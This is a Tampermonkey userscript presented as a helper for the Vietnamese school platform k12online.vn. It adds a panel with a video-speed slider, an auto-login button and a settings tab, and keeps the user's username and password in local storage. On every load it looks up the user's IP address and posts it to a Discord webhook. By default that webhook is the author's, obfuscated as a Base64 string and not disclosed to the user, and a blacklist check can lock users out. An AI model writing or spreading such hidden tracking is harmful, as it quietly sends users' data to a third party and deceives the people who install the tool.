// ==UserScript==
// @name         K12 Helper Pro - Danhvux v24.3 (Custom Webhook)
// @namespace    http://tampermonkey.net/
// @version      24.3
// @description  Bổ sung ô dán Webhook tùy chỉnh, No Cooldown, Fix Webhook.
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        GM_xmlhttpRequest
// @connect      api.ipify.org
// @connect      discord.com
// @connect      localhost
// ==/UserScript==

(function() {
    'use strict';

    // Link gốc mặc định (Base64)
    const _0xdef = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MzUwNTg3NTMwOTAzNTUyMC9CNHZHVXYRTW50SVR6cHV6cHFkZlgyZFZCWVVYeXBHNEdnMU1Db3V6Tm9Jb2xlWWVXb21fZ2g3ZkliOllTQy1yVg==';
    const _0xblk = 'aHR0cDovL2xvY2FsaG9zdDo4MDAwL2JsYWNrbGlzdA==';

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', 
        width: 320, 
        speed: 1, 
        user: '', 
        pass: '', 
        isDarkMode: true,
        customWebhook: '' // Ô trống sẽ dùng mặc định
    };
    
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));
    const currentWebhook = config.customWebhook || atob(_0xdef);

    // --- SECURITY & SEND LOG ---
    const startSecurity = () => {
        return new Promise((resolve) => {
            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
                const userIP = data.ip;

                // Gửi Webhook (Không cooldown)
                fetch(currentWebhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        "username": "Danhvux Log System",
                        "embeds": [{
                            "title": "🚀 Panel v24.3 Initialized",
                            "color": parseInt(config.mainColor.replace('#', ''), 16),
                            "fields": [
                                {"name": "User IP", "value": `\`${userIP}\``, "inline": true},
                                {"name": "Webhook Type", "value": config.customWebhook ? "🟢 Custom" : "⚪ Default", "inline": true}
                            ],
                            "footer": {"text": "K12 Online Helper"},
                            "timestamp": new Date().toISOString()
                        }]
                    })
                }).catch(() => console.log("Webhook check failed"));

                // Blacklist Check
                GM_xmlhttpRequest({
                    method: "GET",
                    url: atob(_0xblk) + "?t=" + Date.now(),
                    onload: (res) => {
                        try {
                            if (JSON.parse(res.responseText).includes(userIP)) {
                                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'>🚫 BANNED</h1>";
                                resolve(false);
                            } else resolve(true);
                        } catch(e) { resolve(true); }
                    },
                    onerror: () => resolve(true)
                });
            }).catch(() => resolve(true));
        });
    };

    startSecurity().then(ok => {
        if (!ok) return;

        const style = document.createElement('style');
        const updateCSS = () => {
            const dark = config.isDarkMode;
            style.innerText = `
                :root { --mc: ${config.mainColor}; --w: ${config.width}px; --bg: ${dark ? '#1e2227' : '#ffffff'}; --text: ${dark ? '#ffffff' : '#1e2227'}; --border: ${dark ? '#333' : '#ddd'}; }
                #dv-panel { position: fixed; top: 60px; right: 20px; width: var(--w) !important; background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 12px; z-index: 999999; box-shadow: 0 8px 30px rgba(0,0,0,0.3); font-family: sans-serif; transition: height 0.3s ease; overflow:hidden; }
                .header { padding: 12px; display: flex; justify-content: space-between; cursor: move; border-bottom: 1px solid var(--border); }
                .tabs { display: flex; background: rgba(0,0,0,0.05); }
                .tab { flex: 1; padding: 10px; text-align: center; cursor: pointer; font-size: 11px; font-weight: bold; opacity: 0.6; }
                .tab.active { opacity: 1; color: var(--mc); border-bottom: 2px solid var(--mc); }
                .content-view { padding: 15px; }
                .content { display: none; } .content.active { display: block; }
                input, button { width: 100%; margin-bottom: 10px; padding: 10px; border-radius: 6px; border: 1px solid var(--border); box-sizing: border-box; background: rgba(0,0,0,0.03); color: var(--text); }
                .btn-save { background: var(--mc); color: #000; font-weight: bold; border: none; cursor: pointer; }
                .footer { font-size: 9px; text-align: center; padding-bottom: 10px; opacity: 0.5; }
            `;
        };
        document.head.appendChild(style); updateCSS();

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header"><b>Danhvux v24.3</b> <span id="close-p" style="cursor:pointer">✖</span></div>
            <div class="tabs">
                <div class="tab active" data-t="0">MAIN</div><div class="tab" data-t="1">SETTING</div>
            </div>
            <div class="content-view">
                <div class="content active">
                    <div style="font-size:12px; margin-bottom:10px;">Tốc độ: <b id="sp-val">${config.speed}</b></div>
                    <input type="range" id="speed-range" min="1" max="16" step="0.5" value="${config.speed}">
                    <button id="btn-login" class="btn-save">🪄 AUTO LOGIN</button>
                </div>
                <div class="content">
                    <label style="font-size:10px">WEBHOOK DISCORD (Để trống nếu dùng mặc định)</label>
                    <input type="text" id="inp-webhook" placeholder="https://discord.com/api/webhooks/..." value="${config.customWebhook}">
                    
                    <label style="font-size:10px">MÀU CHỦ ĐẠO</label>
                    <input type="color" id="inp-color" value="${config.mainColor}">
                    
                    <button id="btn-save-all" class="btn-save">LƯU CÀI ĐẶT</button>
                </div>
            </div>
            <div class="footer">DANHVUX • LOG SYSTEM READY</div>
        `;
        document.body.appendChild(panel);

        // --- LOGIC ---
        const $ = (s) => panel.querySelector(s);
        
        // Chuyển tab
        panel.querySelectorAll('.tab').forEach(t => {
            t.onclick = () => {
                panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                t.classList.add('active');
                panel.querySelectorAll('.content')[t.dataset.t].classList.add('active');
            };
        });

        // Lưu cài đặt
        $('#btn-save-all').onclick = () => {
            config.customWebhook = $('#inp-webhook').value.trim();
            config.mainColor = $('#inp-color').value;
            save();
            updateCSS();
            alert("Đã lưu! Hãy F5 để áp dụng Webhook mới.");
        };

        // Speed
        $('#speed-range').oninput = (e) => {
            config.speed = e.target.value;
            $('#sp-val').innerText = e.target.value;
            document.querySelectorAll('video').forEach(v => v.playbackRate = e.target.value);
        };

        // Đóng/Mở (F2)
        $('#close-p').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', e => { if(e.key === 'F2') panel.style.display = 'block'; });

        // Kéo thả
        let d = false, x, y;
        $('.header').onmousedown = e => { d = true; x = e.clientX - panel.offsetLeft; y = e.clientY - panel.offsetTop; };
        document.onmousemove = e => { if(d) { panel.style.left = (e.clientX - x) + 'px'; panel.style.top = (e.clientY - y) + 'px'; } };
        document.onmouseup = () => d = false;
    });
})();
